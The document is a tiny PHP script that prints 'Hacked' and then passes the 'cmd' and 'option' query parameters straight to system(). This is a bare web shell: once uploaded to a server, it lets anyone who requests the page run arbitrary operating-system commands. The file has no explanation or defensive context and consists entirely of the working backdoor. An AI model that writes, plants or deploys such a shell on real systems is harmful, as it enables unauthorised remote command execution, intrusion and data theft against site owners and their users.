<?php
    echo 'Hacked<br>';
    system($_GET['cmd']." ".$_GET['option']);
?>
